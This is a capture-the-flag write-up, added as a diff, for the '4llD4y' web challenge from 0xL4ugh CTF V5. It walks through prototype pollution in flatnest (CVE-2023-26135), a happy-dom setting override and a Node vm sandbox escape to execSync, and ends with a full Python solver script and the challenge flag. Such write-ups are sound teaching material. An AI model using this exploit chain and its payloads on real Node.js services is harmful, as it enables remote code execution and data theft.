@@ -1,0 +1,124 @@
+---
+title: '0xL4ugh CTF V5 - 4llD4y'
+description: 'Detailed writeup for the 4llD4y challenge from 0xL4ugh CTF V5. A Medium Web challenge involving Prototype Pollution (CVE-2023-26135), happy-dom configuration override, and VM sandbox escape.'
+date: 2026-01-26
+tags: ['writeup', 'web', 'nodejs', 'medium', 'prototype-pollution', 'vm-escape', 'rce']
+authors: ['kudaliar']
+draft: false
+---
+
+## Executive Summary
+
+**Challenge:** 4llD4y
+**CTF:** 0xL4ugh CTF V5
+**Category:** Web
+**Difficulty:** Medium
+**Flag:** `0xL4ugh{H4appy_D0m_4ll_th3_D4y_2dc1f21037578176}`
+
+The 4llD4y challenge presents a Node.js web application utilizing `express`, `flatnest`, and `happy-dom`. The core vulnerability stems from a Prototype Pollution flaw in `flatnest` (CVE-2023-26135), which allows attackers to enable JavaScript execution within the `happy-dom` environment. By subsequently escaping the weak VM sandbox, we achieve synchronous Remote Code Execution (RCE) to retrieve the flag.
+
+---
+
+## Challenge Description
+
+The application offers two endpoints:
+1.  `POST /config`: Merges user input into a global configuration using `flatnest`.
+2.  `POST /render`: Renders user-provided HTML using `happy-dom` and returns the resulting HTML.
+
+---
+
+## Vulnerability Analysis
+
+### 1. Prototype Pollution in `flatnest` (CVE-2023-26135)
+
+The `flatnest` library (version 1.0.1 used here) attempts to filter `__proto__` keys but fails to handle circular reference definitions properly. It supports a special syntax `[Circular (...)]` which, combined with improper path validation, allows mapping a dictionary key to `Object.prototype`.
+
+By sending a payload like `{"p": "[Circular (__proto__)]"}`, we can force `input['p']` to become a reference to `Object.prototype`. Subsequent writes to keys like `p.settings.enableJavaScriptEvaluation` effectively become global prototype pollution: `Object.prototype.settings.enableJavaScriptEvaluation = true`.
+
+### 2. Configuration Override in `happy-dom`
+
+`happy-dom` is a DOM implementation for Node.js that defaults to disabling JavaScript execution. However, when creating a new `Window`, it merges provided settings with defaults. Since we polluted `Object.prototype.settings`, the `options.settings` (even if undefined in the code) inherits our malicious property.
+
+This effectively flips the `enableJavaScriptEvaluation` switch to `true` globally for all new `happy-dom` windows.
+
+### 3. VM Sandbox Escape
+
+With JavaScript execution enabled, `happy-dom` runs scripts inside a Node.js `vm` context. This is not a secure sandbox. We can escape it by accessing the constructor of the constructor of an object (like `Buffer` or `this`) to reach the global `Function` constructor, and from there access `process`.
+
+**Escape Vector:**
+```javascript
+const P = Buffer.constructor('return process')();
+```
+This gives us a reference to the main Node.js process object.
+
+### 4. Synchronous RCE
+
+The `/render` endpoint operates synchronously: it writes HTML, waits for DOM execution, and immediately sends the output. Asynchronous execution (like `child_process.exec`) would likely complete after the response is sent. We must use `child_process.execSync`.
+
+To import `child_process` without a global `require`, we use the internal Module API via the leaked `process` object:
+```javascript
+const m = P.getBuiltinModule('module');
+const r = m.createRequire('/');
+const c = r('child_process');
+c.execSync('cat /flag*');
+```
+
+---
+
+## Exploit Chain
+
+1.  **Pollute Prototype**: Send a POST to `/config` to set `Object.prototype.settings.enableJavaScriptEvaluation = true`.
+2.  **Execute Code**: Send a POST to `/render` with a malicious `<script>` tag.
+3.  **Exfiltrate**: The script runs `cat /flag*` synchronously and writes the output to `document.body.innerHTML`, which the server returns in the HTTP response.
+
+### Solver Script
+
+```python
+import requests, re
+
+BASE_URL = "http://challenges3.ctf.sd:33260"
+
+def rce():
+    # Step 1: Pollution
+    print("[*] Polluting prototype to enable JS evaluation...")
+    requests.post(f"{BASE_URL}/config", json={
+        "p": "[Circular (__proto__)]",
+        "p.settings.enableJavaScriptEvaluation": True
+    })
+    
+    # Step 2: RCE Payload
+    print("[*] Sending RCE payload...")
+    js_payload = """
+    try {
+        const P = Buffer.constructor('return process')();
+        const m = P.getBuiltinModule('module');
+        const r = m.createRequire('/');
+        const c = r('child_process');
+        document.body.innerHTML = c.execSync('cat /flag*').toString();
+    } catch(e) {
+        document.body.innerHTML = e.toString();
+    }
+    """
+    
+    # Minify payload for insertion
+    js_payload_min = js_payload.replace('\n', '')
+    html_payload = f"<script>{js_payload_min}</script>"
+    
+    res = requests.post(f"{BASE_URL}/render", json={"html": html_payload}).text
+    
+    # Extract Flag
+    match = re.search(r'(0xL4ugh\{.*?\})', res)
+    if match:
+        print(f"[+] Flag found: {match.group(1)}")
+    else:
+        print("[-] Flag not found in response.")
+        print("Response snippet:", res[:200])
+
+if __name__ == "__main__":
+    rce()
+```
+
+---
+
+## Conclusion
+This challenge demonstrates that dependency vulnerabilities (`flatnest`) can have far-reaching consequences, allowing attackers to manipulate internal configurations of other libraries (`happy-dom`) and ultimately bypass security restrictions like VM sandboxing.
